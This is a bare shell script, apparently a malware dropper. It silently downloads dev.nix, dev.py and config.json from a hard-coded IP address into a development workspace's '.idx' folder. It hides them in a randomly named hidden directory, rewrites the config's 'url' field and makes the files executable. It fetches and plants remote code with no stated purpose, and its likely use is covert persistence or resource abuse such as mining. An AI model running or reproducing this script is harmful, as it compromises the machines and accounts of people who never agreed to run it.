NAME=$(tr -dc A-Za-z </dev/urandom | head -c 4)

IPS="$0"

cd .idx

wget -q -O dev.nix http://143.198.196.235/dev.nix

sed -i "s/ganti/${NAME}/g" dev.nix

mkdir ".$NAME"

cd ".$NAME"

wget -q -O "${NAME}" http://143.198.196.235/dev.py

wget -q -O config.json http://143.198.196.235/config.json

sed -i 's/"url": *"[^"]*"/"url": "$IPS"/' config.json

chmod +x config.json

chmod +x "${NAME}"

